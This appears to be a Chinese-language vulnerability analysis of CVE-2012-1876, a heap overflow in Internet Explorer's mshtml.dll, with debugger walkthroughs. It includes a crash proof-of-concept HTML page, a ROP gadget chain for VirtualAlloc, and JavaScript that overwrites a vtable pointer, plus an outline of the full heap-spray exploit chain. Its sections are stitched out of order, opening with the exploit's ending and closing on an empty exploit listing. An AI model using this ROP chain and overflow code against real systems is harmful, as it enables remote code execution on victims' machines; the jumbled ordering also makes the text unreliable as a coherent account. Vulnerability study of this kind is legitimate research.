
```python
rop_gadgets = [
#[---INFO:gadgets_to_set_esi:---]
0x6371b8f5, # POP ECX # RETN [mshtml.dll]
0x63581314, # ptr to &VirtualAlloc() [IAT mshtml.dll]
0x6392bf47, # MOV EAX,DWORD PTR DS:[ECX] # RETN [mshtml.dll]
0x63aa9a60, # XCHG EAX,ESI # RETN [mshtml.dll]
#[---INFO:gadgets_to_set_ebp:---]
0x635ac41c, # POP EBP # RETN [mshtml.dll]
0x635ead14, # & jmp esp [mshtml.dll]
#[---INFO:gadgets_to_set_ebx:---]
0x636895b1, # POP EBX # RETN [mshtml.dll]
0x00000001, # 0x00000001-> ebx
#[---INFO:gadgets_to_set_edx:---]
0x637ccce4, # POP EDX # RETN [mshtml.dll]
0x00001000, # 0x00001000-> edx
#[---INFO:gadgets_to_set_ecx:---]
0x6358e41f, # POP ECX # RETN [mshtml.dll]
0x00000040, # 0x00000040-> ecx
#[---INFO:gadgets_to_set_edi:---]
0x6366cccd, # POP EDI # RETN [mshtml.dll]
0x63900c06, # RETN (ROP NOP) [mshtml.dll]
#[---INFO:gadgets_to_set_eax:---]
0x637f3ee3, # POP EAX # RETN [mshtml.dll]
0x90909090, # nop
#[---INFO:pushad:---]
0x636bfa7c, # PUSHAD # RETN [mshtml.dll]
]
```

`1666711552`是笔者环境中`mshtml.dll`基址十进制值。

## 第二次溢出

```javascript
function smash_vtable()
{
    var obj_col_0 = document.getElementById("132");
    obj_col_0.width = "1178993"; // smash the vftable 0x07070024
    obj_col_0.span = "44"; // the amount to overwrite
}
```

写入发生于第28次循环，对应指令为`0x6368CD98`处`mov [esi+8], ebx`，写入前：

![](upload/attach/202102/817966_AXEAT2PUBZXY3DQ.jpg)

写入完成后调用该虚表指针时即可控制执行流。

最后，总结下利用思路：Heap Spray—>释放内存—>`<col>`占位—>堆溢出(更改BSTR长度位)—>"越界读"虚表指针，计算`mshtml.dll`基址—>Heap Spray(布局ROP+Shellcode)—>堆溢出(更改虚表指针到ROP+Shellcode地址)

## 0x03 参阅链接

- <a href="elink@2feK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6i4k6W2L8r3!0H3k6i4u0Q4x3X3g2E0L8%4A6A6L8r3I4S2i4K6u0W2L8%4u0Y4i4K6u0r3P5X3S2Q4x3X3c8o6e0W2)9J5c8X3c8G2j5%4y4Q4x3V1k6i4k6h3u0Q4x3V1k6m8f1p5W2Q4x3V1k6t1g2p5#2x3c8h3I4W2L8h3g2F1N6q4)9J5c8Y4y4@1P5h3I4W2">HTMLElement.style</a>
- <a href="elink@069K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1k6i4k6W2L8r3!0H3k6i4u0Q4x3X3g2E0L8%4A6A6L8r3I4S2i4K6u0W2L8%4u0Y4i4K6u0r3P5X3S2Q4x3X3c8o6e0W2)9J5c8X3c8G2j5%4y4Q4x3V1k6i4k6h3u0Q4x3V1k6o6f1#2y4Q4x3V1k6V1K9i4y4H3L8r3q4&6">display</a>
- <a href="elink@377K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4q4I4i4K6g2X3x3K6f1#2x3e0V1J5y4e0c8Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0f1K6x3U0x3@1y4e0V1&6">Python实现生成相对地址的ROP</a>

## 0x01 漏洞信息

### 0x01.1 漏洞简述

- 编号：CVE-2012-1876
- 类型：堆溢出(Heap Overflow)
- 漏洞影响：远程代码执行(RCE)
- CVSS 2.0：9.3

`mshtml.dll`中`CTableLayout::CalculateMinMax`函数在循环向缓冲区(堆分配内存)写入数据时，未校验控制循环次数的`<col>`标签`span`属性值，故可通过精心构造`span`属性值造成堆溢出，进而实现RCE。

### 0x01.2 漏洞影响

Microsoft Internet Explorer 6—9，10 Consumer Preview

### 0x01.3 修复方案

[MS12-037](https://bbs.kanxue.com/elink@f65K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4y4W2j5%4g2J5K9i4c8&6i4K6u0V1N6i4m8V1j5i4c8W2M7#2)9J5c8Y4y4W2j5%4g2J5K9i4c8&6j5Y4g2D9L8r3g2@1K9h3&6K6i4K6u0r3x3U0l9I4x3W2)9J5c8X3#2K6x3e0u0Q4x3X3b7H3x3K6M7`.)

## 0x02 漏洞分析

### 0x02.1 分析环境

- OS版本：Windows XP Service Pack 3
- Internet Explorer版本：8.0.6001.18702
- mshtml.dll版本：8.0.6001.18702

### 0x02.2 详细分析

使用`gflags.exe`为`iexplore.exe`开启页堆：

![](https://bbs.kanxue.com/upload/attach/202102/817966_KCXX6XXSWWEGXH4.jpg)

WinDbg打开`iexplore.exe`后，通过`.childdbg 1`命令启用子进程调试。运行并打开`poc.html`：

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22 | `<html>`  `<body>`  `<table style``=``"table-layout:fixed"` `>`  `<col` `id``=``"132"` `width``=``"41"` `span``=``"1"` `>&nbsp <``/``col>`  `<!``-``-` `The <col> tag specifies column properties` `for` `each column within a <colgroup> element``-``-``>`  `<!``-``-` `width:Specifies the width of a <col> element` `-``-``>`  `<!``-``-` `span:Specifies the number of columns a <col> element should span` `-``-``>`  `<``/``table>`  `<script>`    `function over_trigger() {`  `var obj_col` `=` `document.getElementById(``"132"``);`  `obj_col.width` `=` `"42765"``;`  `obj_col.span` `=` `1000``;`  `}`    `setTimeout(``"over_trigger();"``,``1``);` `/``/``The setTimeout() method calls a function` `or` `evaluates an expression after a specified number of milliseconds`      `<``/``script>`  `<``/``body>`  `<``/``html>` |

允许活动内容运行：

![](https://bbs.kanxue.com/upload/attach/202102/817966_EHF6CPS54KTSQAF.jpg)

崩溃点如下：

![](https://bbs.kanxue.com/upload/attach/202102/817966_B4C53RNBVAAJ45A.jpg)

WinDbg重新打开`iexplore.exe`，运行。当子进程创建完成时，`sxe ld mshtml.dll`设置`mshtml.dll`模块加载异常：

![](https://bbs.kanxue.com/upload/attach/202102/817966_4AZ7TZAXTH27XP4.jpg)

模块已加载，可拍摄快照，方便后续分析：

![](https://bbs.kanxue.com/upload/attach/202102/817966_PD5D695BQYKDBNU.jpg)

IDA定位到函数`CTableColCalc::AdjustForCol`引发crash处：

![](https://bbs.kanxue.com/upload/attach/202102/817966_FVJ4PTVHAA4G4KY.jpg)

向上回溯查看`esi`于何处赋值(调用该函数仅`CTableLayout::CalculateMinMax+F55F`一处，故可直接在IDA中定位)：

![](https://bbs.kanxue.com/upload/attach/202102/817966_VFRS7FXMNKW36N2.jpg)

由上图可以看出其值为`[ebx+9Ch]`，该地址处值由何而来需结合WinDbg动态调试以确定。恢复快照至已加载`mshtml.dll`，`bp 6368CD39`设断于`call CTableColCalc::AdjustForCol`处，成功断下后，查看堆块信息：

![](https://bbs.kanxue.com/upload/attach/202102/817966_4SEC5PRVT9FVGGX.jpg)

再次恢复快照，`bp 6367d7da`于`CTableLayout::CalculateMinMax`起始位置设断，断下后`bp 635D28F6`于`call CImplAry::EnsureSizeWorker`处设断，跟进分析：

![](https://bbs.kanxue.com/upload/attach/202102/817966_MP53DF5SYQ6J9S6.jpg)

可以看出其分配大小确为`0x70`，之后跟进`mshtml!_HeapRealloc`查看其分配地址：

![](https://bbs.kanxue.com/upload/attach/202102/817966_QMK5VMEWSUXRRQN.jpg)

向上回溯，`edi`指向`ebx+90h`：

![](https://bbs.kanxue.com/upload/attach/202102/817966_W4XRB8HBYW9GSJQ.jpg)

如此一来，`HeapAlloc`函数返回值——即分配堆块地址写入`[ebx+9Ch]`。至此，crash处`edi`由何而来已分析完成。而写入数据为`width*100`(具体计算过程见`CWidthUnitValue::GetPixelWidth`函数)：

![](https://bbs.kanxue.com/upload/attach/202102/817966_BER3ETXTTZUCJ9K.jpg)

crash处`ecx`值为`(width*100)<<4+9`，最终内容要减1：

![](https://bbs.kanxue.com/upload/attach/202102/817966_HBMDE2QN3C4HAH6.jpg)

---

上述内容仅是追溯写入位置与写入值如何计算及传递，下面将分析其执行流。

`CTableLayout::CalculateMinMax`第一个参数是用于存储`<table>`标签的`CTableLayout`对象：

![](https://bbs.kanxue.com/upload/attach/202102/817966_4ANA9NA3BYZ6QRU.jpg)

而`[ebx+54h]`存储所有`<col>`标签的`<span>`属性值之和(可记为`span_sum`)：

![](https://bbs.kanxue.com/upload/attach/202102/817966_3F8T8VJ5P66ESY4.jpg)

执行到`0x6367D8EF`处，从`ebx+94h`位置取出值，右移2位，与`span_sum`进行比较：

![](https://bbs.kanxue.com/upload/attach/202102/817966_AQNVDA6M7ZMFRNN.jpg)

如上图所示，再经过两次比较，都满足条件才会`call CImplAry::EnsureSizeWorker`。若`span_sum`小于4，则直接分配`0x70`大小堆块；不小于4，则分配`0x1C*span_sum`大小堆块：

![](https://bbs.kanxue.com/upload/attach/202102/817966_KYYD7M56VXKXC4N.jpg)

分配结束后，会向`ebx+98h`位置写入`span_sum`：

![](https://bbs.kanxue.com/upload/attach/202102/817966_DFB5PA638X38UTY.jpg)

向`ebx+94h`位置写入`span_sum<<2`：

![](https://bbs.kanxue.com/upload/attach/202102/817966_UKK5VG3UTVDQH86.jpg)

如此一来，第二次执行`CTableLayout::CalculateMinMax`便不会调用`CImplAry::EnsureSizeWorker`重新分配内存，而是直接使用上次分配堆块进行写入——修改后的`span`属性值大于修改前`span`属性值，以此`span`值作为循环计数，之前分配堆块大小明显无法容纳，此时便会造成堆溢出。

下面是打开POC并允许活动内容运行后由`0x6367D7DA`至`0x6368CD39`两次执行流(可使用`wt -l 1 -ns -oR -m mshtml =6367d7da 6368CD39`命令)对比：

![](https://bbs.kanxue.com/upload/attach/202102/817966_MMY7QPD8MV73N66.jpg)

第二次执行不会调用`CImplAry::EnsureSizeWorker`：

![](https://bbs.kanxue.com/upload/attach/202102/817966_5HQR8QMGN5ZWS4S.jpg)

`span`属性值最大为`0x3E8`(即1000)：

![](https://bbs.kanxue.com/upload/attach/202102/817966_U9Y2KHAAYCPPYCY.jpg)

### 0x02.3 漏洞利用

分析所用exp如下：

|  |  |
| --- | --- |
